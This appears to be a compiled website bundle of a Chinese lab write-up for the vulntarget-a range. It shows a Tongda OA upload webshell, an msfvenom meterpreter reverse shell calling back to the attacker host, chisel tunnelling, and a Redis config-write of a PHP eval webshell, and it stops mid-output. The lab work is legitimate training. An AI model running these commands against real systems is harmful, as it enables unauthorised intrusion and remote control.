"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4276],{68014:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>r});const i=JSON.parse('{"id":"Independent-Environment/Vulntarget/vulntarget-a/index","title":"vulntarget-a","description":"\u7b80\u4ecb","source":"@site/docs/Independent-Environment/Vulntarget/vulntarget-a/index.md","sourceDirName":"Independent-Environment/Vulntarget/vulntarget-a","slug":"/Independent-Environment/Vulntarget/vulntarget-a/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/Vulntarget/vulntarget-a/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"\u7ea2\u65e5\u9776\u573a #2","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-2/"},"next":{"title":"vulntarget-b","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/"}}');var a=s(74848),t=s(28453);const c={},l="vulntarget-a",o={},r=[{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb",level:2},{value:"\u5165\u53e3\u63a2\u6d4b",id:"\u5165\u53e3\u63a2\u6d4b",level:2},{value:"\u901a\u8fbe OA \u6587\u4ef6\u4e0a\u4f20",id:"\u901a\u8fbe-oa-\u6587\u4ef6\u4e0a\u4f20",level:2},{value:"win7 \u6301\u4e45\u5316",id:"win7-\u6301\u4e45\u5316",level:2},{value:"\u5efa\u7acb\u5185\u7f51\u4ee3\u7406",id:"\u5efa\u7acb\u5185\u7f51\u4ee3\u7406",level:2},{value:"\u5185\u7f51\u626b\u63cf",id:"\u5185\u7f51\u626b\u63cf",level:2},{value:"win2016 redis \u672a\u6388\u6743",id:"win2016-redis-\u672a\u6388\u6743",level:2},{value:"win2016 \u6301\u4e45\u5316",id:"win2016-\u6301\u4e45\u5316",level:2},{value:"\u57df\u4fe1\u606f\u6536\u96c6",id:"\u57df\u4fe1\u606f\u6536\u96c6",level:2},{value:"\u5efa\u7acb\u4e8c\u5c42\u5185\u7f51\u4ee3\u7406",id:"\u5efa\u7acb\u4e8c\u5c42\u5185\u7f51\u4ee3\u7406",level:2},{value:"win2019 \u4fa6\u5bdf",id:"win2019-\u4fa6\u5bdf",level:2},{value:"win2019 \u57df\u54c8\u5e0c\u6536\u96c6",id:"win2019-\u57df\u54c8\u5e0c\u6536\u96c6",level:2},{value:"Reference",id:"reference",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"vulntarget-a",children:"vulntarget-a"})}),"\n",(0,a.jsx)(n.h2,{id:"\u7b80\u4ecb",children:"\u7b80\u4ecb"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ",children:"vulntarget \u6f0f\u6d1e\u9776\u573a\u7cfb\u5217 (\u4e00) - \u661f\u671f\u4e94\u5b9e\u9a8c\u5ba4"})}),"\n",(0,a.jsx)(n.p,{children:"\u9776\u573a\u7684\u7f51\u7edc\u62d3\u6251"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(53300).A+"",width:"1054",height:"417"})}),"\n",(0,a.jsx)(n.p,{children:"\u9700\u8981\u5728\u865a\u62df\u7f51\u7edc\u7f16\u8f91\u5668\u4e2d\uff0c\u5b9a\u4e49\u4e24\u4e2a\u865a\u62df\u7f51\u7edc"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"VMnet18 Host-only: 10.0.20.0/24\nVMnet19 Host-only: 10.0.10.0/24\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"win7"})," \u8fd9\u53f0\u865a\u62df\u673a\u4f5c\u4e3a\u5165\u53e3\u673a\uff0c\u9ed8\u8ba4\u7684\u7f51\u5361\u5305\u542b\u4e00\u5f20\u6865\u63a5\u6a21\u5f0f\u7684\u865a\u62df\u7f51\u5361\uff0c\u53ef\u4ee5\u89c6\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u4fee\u6539"]}),"\n",(0,a.jsx)(n.p,{children:"\u76f4\u63a5\u5bfc\u5165 3 \u4e2a\u865a\u62df\u673a\u5373\u53ef\uff0c\u516c\u4f17\u53f7\u5199\u7684\u662f\u8bbe\u8ba1\u9776\u573a\u7684\u8fc7\u7a0b"}),"\n",(0,a.jsxs)(n.p,{children:["\u5efa\u8bae\u6309\u7167 ",(0,a.jsx)(n.code,{children:"win2019"})," ->  ",(0,a.jsx)(n.code,{children:"win2016"}),"->  ",(0,a.jsx)(n.code,{children:"win7"})," \u7684\u987a\u5e8f\u8fdb\u884c\u542f\u52a8\u865a\u62df\u673a"]}),"\n",(0,a.jsx)(n.admonition,{type:"warning",children:(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"win7 \u5165\u53e3 win7"})," \u8fd9\u53f0\u9776\u673a\u5e26\u6709\u81ea\u52a8\u7761\u7720\uff0c\u9700\u8981\u6ce8\u610f"]})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="\u8d26\u53f7\u4fe1\u606f"',children:"win2019 \u57df\u63a7 - 2019\n\n- \u8d26\u53f7\uff1aadministrator\n- \u5bc6\u7801\uff1aAdmin@666\n\nwin2016 \u57df\u6210\u5458 - 2016\n- \u8d26\u53f7\uff1aAdministrator\n- \u5bc6\u7801\uff1aAdmin@123\n\n- \u8d26\u53f7\uff1abalsec.com\\win2016\n- \u5bc6\u7801\uff1aAdmin#123\n\nwin7 \u5165\u53e3 win7\n- \u8d26\u53f7\uff1awin7\n- \u5bc6\u7801\uff1aadmin\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u5165\u53e3\u63a2\u6d4b",children:"\u5165\u53e3\u63a2\u6d4b"}),"\n",(0,a.jsxs)(n.p,{children:["\u76f4\u63a5\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"fscan"})," \u5bf9\u9776\u673a\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"start infoscan\n192.168.200.10:80 open\n192.168.200.10:139 open\n192.168.200.10:135 open\n192.168.200.10:445 open\n[*] alive ports len is: 4\nstart vulscan\n[*] NetInfo\n[*]192.168.200.10\n   [->]win7-PC\n   [->]10.0.20.98\n   [->]192.168.200.10\n[*] WebTitle http://192.168.200.10     code:200 len:10065  title: \u901a\u8fbe OA \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf\n[+] MS17-010 192.168.200.10     (Windows 7 Professional 7601 Service Pack 1)\n[+] InfoScan http://192.168.200.10     [\u901a\u8fbe OA]\n[+] PocScan http://192.168.200.10 tongda-user-session-disclosure\n[+] PocScan http://192.168.200.10 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5f88\u660e\u663e\u4e24\u4e2a\u6d1e\uff1a\u901a\u8fbe OA \u7684\u6587\u4ef6\u4e0a\u4f20 + \u6c38\u6052\u4e4b\u84dd"}),"\n",(0,a.jsx)(n.p,{children:"\u6c38\u6052\u4e4b\u84dd\u5728\u6ca1\u6709\u5b89\u5168\u8f6f\u4ef6\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u6740\u5230 system \u6743\u9650\uff0c\u6240\u4ee5\u5148\u5c1d\u8bd5\u901a\u8fbe OA \u7684\u6d1e"}),"\n",(0,a.jsx)(n.h2,{id:"\u901a\u8fbe-oa-\u6587\u4ef6\u4e0a\u4f20",children:"\u901a\u8fbe OA \u6587\u4ef6\u4e0a\u4f20"}),"\n",(0,a.jsx)(n.p,{children:"\u76f4\u63a5\u65e0\u8111\u4e0a\u5de5\u5177"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://github.com/R4gd0ll/I-Wanna-Get-All",children:"R4gd0ll/I-Wanna-Get-All: OA \u6f0f\u6d1e\u5229\u7528\u5de5\u5177"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(63421).A+"",width:"1924",height:"1412"})}),"\n",(0,a.jsx)(n.p,{children:"\u5199\u5165\u4e00\u4e2a webshell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(37503).A+"",width:"1924",height:"1412"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Url: http://192.168.200.10/R4g1730385139621.php\nPwd: whoami\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://github.com/achuna33/MYExploit",children:"achuna33/MYExploit: OAExploit \u4e00\u6b3e\u57fa\u4e8e\u4ea7\u54c1\u7684\u4e00\u952e\u626b\u63cf\u5de5\u5177"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(92909).A+"",width:"1504",height:"1247"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u5199\u5165\u7684 webshell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(18807).A+"",width:"1542",height:"1040"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u8fde\u63a5"}),"\n",(0,a.jsx)(n.h2,{id:"win7-\u6301\u4e45\u5316",children:"win7 \u6301\u4e45\u5316"}),"\n",(0,a.jsx)(n.p,{children:"\u6784\u9020\u9a6c\u5b50\u5b9e\u73b0\u6301\u4e45\u5316"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=3333 -f exe > 192.168.200.129-3333.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u57fa\u4e8e\u8681\u5251\u4e0a\u4f20\u81f3\u9776\u673a"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(32730).A+"",width:"1546",height:"1043"})}),"\n",(0,a.jsx)(n.p,{children:"\u6267\u884c\u76d1\u542c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ msfconsole -q\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 0.0.0.0\nLHOST => 0.0.0.0\nmsf6 exploit(multi/handler) > set LPORT 3333\nLPORT => 3333\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 0.0.0.0:3333\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(30069).A+"",width:"1959",height:"1083"})}),"\n",(0,a.jsxs)(n.p,{children:["\u6210\u529f\u5efa\u7acb Meterpreter \u4f1a\u8bdd\uff0c\u5e76\u4e14\u5df2\u7ecf\u662f ",(0,a.jsx)(n.code,{children:"NT AUTHORITY\\SYSTEM"})," \u7528\u6237"]}),"\n",(0,a.jsx)(n.h2,{id:"\u5efa\u7acb\u5185\u7f51\u4ee3\u7406",children:"\u5efa\u7acb\u5185\u7f51\u4ee3\u7406"}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"chisel"})," \u5efa\u7acb\u5185\u7f51\u4ee3\u7406"]}),"\n",(0,a.jsx)(n.admonition,{type:"warning",children:(0,a.jsxs)(n.p,{children:["\u9700\u8981\u6ce8\u610f\uff0c\u9ad8\u7248\u672c ",(0,a.jsx)(n.code,{children:"go"})," \u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53d6\u6d88\u4e86\u5bf9\u4f4e\u7248\u672c Windows \u7684\u652f\u6301\uff0c\u5efa\u8bae\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"chisel v1.8.1"})]})}),"\n",(0,a.jsxs)(n.p,{children:["\u4e0a\u4f20 ",(0,a.jsx)(n.code,{children:"chisel"})," \u4e8c\u8fdb\u5236\u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"meterpreter > upload ./tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe\n[*] Uploading  : /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe\n[*] Uploaded 8.00 MiB of 8.59 MiB (93.14%): /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe\n[*] Uploaded 8.59 MiB of 8.59 MiB (100.0%): /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe\n[*] Completed  : /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u542f\u52a8\u670d\u52a1\u7aef"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="kali 192.168.200.129"',children:"$ ./tools/chisel-v1.8.1/chisel_1.8.1_linux_amd64 server -p 1337 --reverse\n2024/10/31 22:44:56 server: Fingerprint ygeqrFtSRXQYYW1Xf04LJNLAtoveMD+jrlJ4jwApR+Y=\n2024/10/31 22:44:56 server: Listening on http://0.0.0.0:1337\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5efa\u7acb\u4ee3\u7406\u4f1a\u8bdd"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win7 192.168.200.10 | 10.0.20.98"',children:"C:\\>cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks\ncmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u5185\u7f51\u626b\u63cf",children:"\u5185\u7f51\u626b\u63cf"}),"\n",(0,a.jsxs)(n.p,{children:["\u914d\u7f6e ",(0,a.jsx)(n.code,{children:"proxychains"})," \u914d\u7f6e\u6587\u4ef6\u4e3a ",(0,a.jsx)(n.code,{children:"chisel"})," \u4ee3\u7406\u7aef\u53e3\u4e4b\u540e\uff0c\u4f7f\u7528 fscan \u8fdb\u884c\u626b\u63cf"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.20.0/24\n\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 10.0.20.1       is alive\n(icmp) Target 10.0.20.98      is alive\n[*] Icmp alive hosts len is: 2\n10.0.20.98:135 open\n10.0.20.98:139 open\n10.0.20.98:445 open\n10.0.20.1:445 open\n10.0.20.1:139 open\n10.0.20.1:135 open\n10.0.20.98:80 open\n10.0.20.1:7680 open\n10.0.20.1:7890 open\n[*] alive ports len is: 9\nstart vulscan\n[*] NetInfo\n[*]10.0.20.98\n   [->]win7-PC\n   [->]10.0.20.98\n   [->]192.168.200.10\n[+] MS17-010 10.0.20.98 (Windows 7 Professional 7601 Service Pack 1)\n[*] NetInfo\n[*]10.0.20.1\n   [->]DESKTOP-7HGIVVS\n   [->]192.168.200.1\n   [->]172.25.0.1\n   [->]192.168.56.1\n   [->]192.168.123.116\n   [->]10.0.10.1\n   [->]10.0.20.1\n   [->]192.168.137.1\n   [->]2001:0:2851:b9f0:8b3:1b5b:8fcc:f2a8\n[*] WebTitle http://10.0.20.1:7890     code:400 len:0      title:None\n[*] WebTitle http://10.0.20.98         code:200 len:10065  title: \u901a\u8fbe OA \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf\n[+] InfoScan http://10.0.20.98         [\u901a\u8fbe OA]\n[+] PocScan http://10.0.20.98 tongda-user-session-disclosure\n\u5df2\u5b8c\u6210 9/9\n[*] \u626b\u63cf\u7ed3\u675f, \u8017\u65f6: 12.349497283s\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u6392\u9664\u6389 ",(0,a.jsx)(n.code,{children:"win7 10.0.20.98"})," \u548c ",(0,a.jsx)(n.code,{children:"Vmware 10.0.20.1"})," \u4e4b\u540e\uff0c\u4f1a\u53d1\u73b0\u7ed3\u679c\u4e0d\u5bf9\uff0c\u56e0\u4e3a Windows Server \u4f1a\u4e0d\u54cd\u5e94 ICMP \u8bf7\u6c42\uff0c\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b ARP \u8868\u6765\u53d1\u73b0"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win7 192.168.200.10 | 10.0.20.98"',children:"C:\\>arp -a\n\nInterface: 192.168.200.10 --- 0xb\n  Internet Address      Physical Address      Type\n  192.168.200.0         00-50-56-eb-cc-78     dynamic\n  192.168.200.1         00-50-56-c0-00-00     dynamic\n  192.168.200.129       00-0c-29-07-06-1a     dynamic\n  192.168.200.254       00-50-56-fb-ab-25     dynamic\n  192.168.200.255       ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n\nInterface: 10.0.20.98 --- 0xd\n  Internet Address      Physical Address      Type\n  10.0.20.1             00-50-56-c0-00-12     dynamic\n  10.0.20.99            00-0c-29-49-db-32     dynamic\n  10.0.20.254           00-50-56-f9-77-e1     dynamic\n  10.0.20.255           ff-ff-ff-ff-ff-ff     static\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u6709 ",(0,a.jsx)(n.code,{children:"10.0.20.99"})," \u4e3b\u673a\uff0c\u5c1d\u8bd5\u626b\u63cf"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.20.99 -np\n\nstart infoscan\n10.0.20.99:80 open\n10.0.20.99:6379 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://10.0.20.99         code:200 len:11     title:None\n[+] Redis 10.0.20.99:6379 unauthorized file:C:\\Program Files\\Redis/dump.rdb\n\u5df2\u5b8c\u6210 2/2\n[*] \u626b\u63cf\u7ed3\u675f, \u8017\u65f6: 10.492549051s\n"})}),"\n",(0,a.jsx)(n.h2,{id:"win2016-redis-\u672a\u6388\u6743",children:"win2016 redis \u672a\u6388\u6743"}),"\n",(0,a.jsx)(n.p,{children:"\u5efa\u7acb\u7aef\u53e3\u8f6c\u53d1"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win7 192.168.200.10 | 10.0.20.98"',children:"C:\\>cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379\ncmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,a.jsx)(n.a,{href:"https://github.com/SafeGroceryStore/MDUT",children:"SafeGroceryStore/MDUT: MDUT - Multiple Database Utilization Tools"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(28555).A+"",width:"1351",height:"1204"})}),"\n",(0,a.jsx)(n.p,{children:"\u540c\u65f6\u505a\u4e00\u4e0b\u76ee\u5f55\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"Target: http://10.0.20.99/\n\n[23:56:38] Starting:\n[23:57:32] 200 -   14KB - /l.php\n[23:57:43] 200 -   71KB - /phpinfo.php\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b ",(0,a.jsx)(n.code,{children:"phpinfo.php"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(18118).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsxs)(n.p,{children:["\u4ee5\u53ca ",(0,a.jsx)(n.code,{children:"l.php"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(71816).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u77e5\u9053\u7f51\u7ad9\u7684\u7edd\u5bf9\u8def\u5f84\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u914d\u5408\u5199\u5165 webshell"}),"\n",(0,a.jsx)(n.p,{children:"\u76f4\u63a5\u4f7f\u7528 Redis \u672a\u6388\u6743\u5199\u5165 webshel"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'$ proxychains -q redis-cli -h 10.0.20.99\n10.0.20.99:6379> config set dir "C:/phpStudy/PHPTutorial/WWW/"\nOK\n10.0.20.99:6379> config set dbfilename shell.php\nOK\n10.0.20.99:6379> set webshell "<?php @eval($_POST[\'shell\']);?>"\nOK\n10.0.20.99:6379> save\nOK\n10.0.20.99:6379> exit\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(52577).A+"",width:"1544",height:"1042"})}),"\n",(0,a.jsx)(n.p,{children:"\u6000\u7591\u5b58\u5728\u6709\u5b89\u5168\u8f6f\u4ef6"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(6869).A+"",width:"1544",height:"1042"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u7f51\u6bb5\u4fe1\u606f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"C:\\phpStudy\\PHPTutorial\\WWW> ipconfig\nWindows IP \u914d\u7f6e\n\u4ee5\u592a\u7f51\u9002\u914d\u5668 Ethernet0:\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::9190:38ad:1e9d:7f70%10\n   IPv4 \u5730\u5740 . . . . . . . . . . . . : 10.0.20.99\n   \u5b50\u7f51\u63a9\u7801  . . . . . . . . . . . . : 255.255.255.0\n   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . :\n\u4ee5\u592a\u7f51\u9002\u914d\u5668 Ethernet1:\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::919b:ab4d:10b3:df65%13\n   IPv4 \u5730\u5740 . . . . . . . . . . . . : 10.0.10.111\n   \u5b50\u7f51\u63a9\u7801  . . . . . . . . . . . . : 255.255.255.0\n   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . :\n\u96a7\u9053\u9002\u914d\u5668 isatap.{A7027029-ECC3-4186-BC98-9DCE01AAA9D0}:\n   \u5a92\u4f53\u72b6\u6001  . . . . . . . . . . . . : \u5a92\u4f53\u5df2\u65ad\u5f00\u8fde\u63a5\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n\u96a7\u9053\u9002\u914d\u5668 isatap.{82CC4AA7-AABB-4296-94AE-3AB9161E5B11}:\n   \u5a92\u4f53\u72b6\u6001  . . . . . . . . . . . . : \u5a92\u4f53\u5df2\u65ad\u5f00\u8fde\u63a5\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="win2016 10.0.20.99 | 10.0.10.111"',children:"C:\\phpStudy\\PHPTutorial\\WWW> whoami\nnt authority\\system\n"})}),"\n",(0,a.jsx)(n.h2,{id:"win2016-\u6301\u4e45\u5316",children:"win2016 \u6301\u4e45\u5316"}),"\n",(0,a.jsx)(n.p,{children:"\u5173\u95ed\u9632\u706b\u5899"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"C:\\phpStudy\\PHPTutorial\\WWW> netsh advfirewall show allprofiles\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\u05e8\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\u0237\ufffd\ufffd\ufffd\ufffd\n\nC:\\phpStudy\\PHPTutorial\\WWW> chcp 65001\nActive code page: 65001\n\nC:\\phpStudy\\PHPTutorial\\WWW> netsh advfirewall show allprofiles\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \ufffd\ufffd\ufffd\ufffd:\n----------------------------------------------------------------------\n\u05f4\u032c                                  \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\ufffd\ufffd\ufffd                          BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nLocalConSecRules                      N/A (\ufffd\ufffd GPO \ufffd\u6d22)\nInboundUserNotification               \ufffd\ufffd\ufffd\ufffd\nRemoteManagement                      \ufffd\ufffd\ufffd\ufffd\nUnicastResponseToMulticast            \ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\u05be:\nLogAllowedConnections                 \ufffd\ufffd\ufffd\ufffd\nLogDroppedConnections                 \ufffd\ufffd\ufffd\ufffd\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           